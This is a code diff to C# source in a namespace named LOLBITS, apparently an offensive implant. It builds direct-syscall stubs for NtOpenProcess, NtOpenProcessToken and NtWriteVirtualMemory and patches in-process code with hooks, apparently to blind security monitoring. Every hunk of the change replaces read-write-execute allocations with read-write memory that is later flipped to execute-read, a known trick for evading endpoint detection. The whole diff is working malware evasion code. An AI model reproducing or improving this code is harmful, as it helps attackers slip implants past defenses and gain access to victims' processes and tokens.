@@ -165,7 +165,7 @@ namespace LOLBITS
             var shellCode = sysCall.GetSysCallAsm("NtOpenProcess");
 
             object[] virtualAlloc = { IntPtr.Zero, (UIntPtr)shellCode.Length, DInvoke.Win32.Kernel32.MemoryAllocationFlags.Commit | DInvoke.Win32.Kernel32.MemoryAllocationFlags.Reserve,
-                                      DInvoke.Win32.Kernel32.MemoryProtectionFlags.ExecuteReadWrite };
+                                      DInvoke.Win32.Kernel32.MemoryProtectionFlags.ReadWrite };
             var shellCodeBuffer = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualAlloc", 
                                                                                     typeof(DInvoke.Win32.DELEGATES.VirtualAlloc), virtualAlloc);
 
@@ -173,6 +173,11 @@ namespace LOLBITS
             var sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtOpenProcess));
             var token = IntPtr.Zero;
             var arguments = new object[] { handle, flags, objectAtt, clientId};
+
+            uint oldProtect = 0;
+            object[] parameters = { (IntPtr)(-1), shellCodeBuffer, (UIntPtr)shellCode.Length, (uint)DInvoke.Win32.Kernel32.MemoryProtectionFlags.ExecuteRead, oldProtect };
+            IntPtr response = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualProtectEx",
+                                                                                typeof(DInvoke.Win32.DELEGATES.VirtualProtectEx), parameters);
             var returnValue = sysCallDelegate.DynamicInvoke(arguments);
 
             handle = (int)returnValue == 0 ? (IntPtr)arguments[0] : IntPtr.Zero;
@@ -184,7 +189,7 @@ namespace LOLBITS
             var shellCode = sysCall.GetSysCallAsm("NtOpenProcessToken");
 
             object[] virtualAlloc = { IntPtr.Zero, (UIntPtr)shellCode.Length, DInvoke.Win32.Kernel32.MemoryAllocationFlags.Commit | DInvoke.Win32.Kernel32.MemoryAllocationFlags.Reserve,
-                                      DInvoke.Win32.Kernel32.MemoryProtectionFlags.ExecuteReadWrite };
+                                      DInvoke.Win32.Kernel32.MemoryProtectionFlags.ReadWrite };
             var shellCodeBuffer = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualAlloc", 
                                                                                     typeof(DInvoke.Win32.DELEGATES.VirtualAlloc), virtualAlloc);
 
@@ -192,6 +197,11 @@ namespace LOLBITS
             var sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtOpenProcessToken));
             var token = IntPtr.Zero;
             var arguments = new object[] { handle, access, token };
+
+            uint oldProtect = 0;
+            object[] parameters = { (IntPtr)(-1), shellCodeBuffer, (UIntPtr)shellCode.Length, (uint)DInvoke.Win32.Kernel32.MemoryProtectionFlags.ExecuteRead, oldProtect };
+            IntPtr response = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualProtectEx",
+                                                                                typeof(DInvoke.Win32.DELEGATES.VirtualProtectEx), parameters);
             var returnValue = sysCallDelegate.DynamicInvoke(arguments);
 
 
@@ -290,7 +300,7 @@ namespace LOLBITS
             if (address == IntPtr.Zero)
                 return false;
 
-            object[] parameters = { (IntPtr)(-1), address, (UIntPtr)hook.Length, (uint)0x40, oldProtect };
+            object[] parameters = { (IntPtr)(-1), address, (UIntPtr)hook.Length, (uint)0x004, oldProtect };
 
             IntPtr hProcess = Process.GetCurrentProcess().Handle;
 
@@ -300,13 +310,18 @@ namespace LOLBITS
             oldProtect = (uint)parameters[4];
 
             object[] virtualAlloc = { IntPtr.Zero, (UIntPtr)shellCode.Length, DInvoke.Win32.Kernel32.MemoryAllocationFlags.Commit | DInvoke.Win32.Kernel32.MemoryAllocationFlags.Reserve,
-                                      DInvoke.Win32.Kernel32.MemoryProtectionFlags.ExecuteReadWrite };
+                                      DInvoke.Win32.Kernel32.MemoryProtectionFlags.ReadWrite };
             var shellCodeBuffer = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualAlloc", 
                                                                                     typeof(DInvoke.Win32.DELEGATES.VirtualAlloc), virtualAlloc);
 
             Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
             var sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtWriteVirtualMemory));
             var arguments = new object[] { hProcess, address, hook, (UIntPtr)(hook.Length), IntPtr.Zero };
+
+            uint old = 0;
+            parameters = new object[] { (IntPtr)(-1), shellCodeBuffer, (UIntPtr)shellCode.Length, (uint)DInvoke.Win32.Kernel32.MemoryProtectionFlags.ExecuteRead, old };
+            response = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualProtectEx",
+                                                                                typeof(DInvoke.Win32.DELEGATES.VirtualProtectEx), parameters);
             var returnValue = sysCallDelegate.DynamicInvoke(arguments);
             if ((int)returnValue != 0)
                 return false;
@@ -340,7 +355,7 @@ namespace LOLBITS
             if (address == IntPtr.Zero)
                 return false;
 
-            object[] parameters = { (IntPtr)(-1), address, (UIntPtr)hook.Length, (uint)0x40, oldProtect };
+            object[] parameters = { (IntPtr)(-1), address, (UIntPtr)hook.Length, (uint)0x004, oldProtect };
 
             IntPtr hProcess = Process.GetCurrentProcess().Handle;
 
@@ -350,13 +365,18 @@ namespace LOLBITS
             oldProtect = (uint)parameters[4];
 
             object[] virtualAlloc = { IntPtr.Zero, (UIntPtr)shellCode.Length, DInvoke.Win32.Kernel32.MemoryAllocationFlags.Commit | DInvoke.Win32.Kernel32.MemoryAllocationFlags.Reserve,
-                                      DInvoke.Win32.Kernel32.MemoryProtectionFlags.ExecuteReadWrite };
+                                      DInvoke.Win32.Kernel32.MemoryProtectionFlags.ReadWrite };
             var shellCodeBuffer = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualAlloc",
                                                                                     typeof(DInvoke.Win32.DELEGATES.VirtualAlloc), virtualAlloc);
 
             Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
             var sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtWriteVirtualMemory));
             var arguments = new object[] { hProcess, address, hook, (UIntPtr)(hook.Length), IntPtr.Zero };
+
+            uint old = 0;
+            parameters = new object[] { (IntPtr)(-1), shellCodeBuffer, (UIntPtr)shellCode.Length, (uint)DInvoke.Win32.Kernel32.MemoryProtectionFlags.ExecuteRead, old };
+            response = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualProtectEx",
+                                                                                typeof(DInvoke.Win32.DELEGATES.VirtualProtectEx), parameters);
             var returnValue = sysCallDelegate.DynamicInvoke(arguments);
             if ((int)returnValue != 0)
                 return false;
